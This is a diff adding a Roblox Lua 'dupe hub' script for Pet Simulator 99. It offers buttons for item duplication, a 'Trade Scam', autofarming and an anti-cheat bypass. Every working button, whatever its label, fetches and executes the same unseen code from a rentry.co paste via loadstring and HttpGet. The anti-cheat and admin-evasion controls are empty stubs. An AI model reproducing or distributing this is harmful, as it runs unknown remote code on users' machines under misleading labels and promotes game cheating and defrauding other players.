@@ -1,0 +1,111 @@
+-- Load Orion Library
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+
+-- Create the main window with the specified name
+local Window = OrionLib:MakeWindow({
+    Name = "PS99 Dupe Hub (Made By Akari)",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionLib"
+})
+
+-- Create the "PS99 Scripts" tab without sections
+local TabPS99 = Window:MakeTab({
+    Name = "PS99 Scripts",
+    Icon = "rbxassetid://12345678", -- Use a valid asset ID for the icon
+    PremiumOnly = false
+})
+
+-- Define the function to be used by all buttons
+local function ExecuteScript()
+    loadstring(game:HttpGet('https://rentry.co/vbnpg2zk/raw', true))()
+end
+
+-- Add buttons to the "PS99 Scripts" tab
+TabPS99:AddButton({
+    Name = "PS99 Dupe",
+    Callback = function()
+        print("Executing PS99 Dupe script...")
+        ExecuteScript()
+    end
+})
+
+TabPS99:AddButton({
+    Name = "PS99 Trade Scam",
+    Callback = function()
+        print("Executing PS99 Trade Scam script...")
+        ExecuteScript()
+    end
+})
+
+TabPS99:AddButton({
+    Name = "PS99 Autofarm",
+    Callback = function()
+        print("Executing PS99 Autofarm script...")
+        ExecuteScript()
+    end
+})
+
+-- Add a toggle switch to the "PS99 Scripts" tab
+TabPS99:AddToggle({
+    Name = "On/Off",
+    Default = false, -- Set default state to Off (false)
+    Callback = function(state)
+        if state then
+            print("Toggle is ON")
+            loadstring(game:HttpGet('https://rentry.co/vbnpg2zk/raw', true))()
+        else
+            print("Toggle is OFF")
+            -- Add logic for when the toggle is OFF here, if needed
+        end
+    end
+})
+
+-- Create the "Settings" tab with updated section names
+local TabSettings = Window:MakeTab({
+    Name = "Settings",
+    Icon = "rbxassetid://87654321", -- Use a valid asset ID for the icon
+    PremiumOnly = false
+})
+
+-- Remove the "General Settings" section and rename "Advanced Settings" to "Script Settings"
+TabSettings:AddSection({
+    Name = "Script Settings",
+    Side = "Left" -- or "Right"
+})
+
+-- Add buttons and toggle to the "Script Settings" section in the "Settings" tab
+TabSettings:AddButton({
+    Name = "Auto Leave When Admin Joins",
+    Callback = function()
+        print("Auto Leave When Admin Joins activated!")
+        -- Add logic to auto leave when an admin joins here
+    end
+})
+
+-- Add Anti-Cheat Bypass button
+TabSettings:AddButton({
+    Name = "Anti-Cheat Bypass",
+    Callback = function()
+        print("Anti-Cheat Bypass activated!")
+        -- Add logic for Anti-Cheat Bypass here
+    end
+})
+
+-- Add a toggle for Anti-Cheat Bypass functionality
+TabSettings:AddToggle({
+    Name = "Anti-Cheat Bypass Toggle",
+    Default = false, -- Set default state to Off (false)
+    Callback = function(state)
+        if state then
+            print("Anti-Cheat Bypass Toggle is ON")
+            -- Add logic to enable Anti-Cheat Bypass here
+        else
+            print("Anti-Cheat Bypass Toggle is OFF")
+            -- Add logic to disable Anti-Cheat Bypass here
+        end
+    end
+})
+
+-- Optional: Save settings for user
+OrionLib:Init()
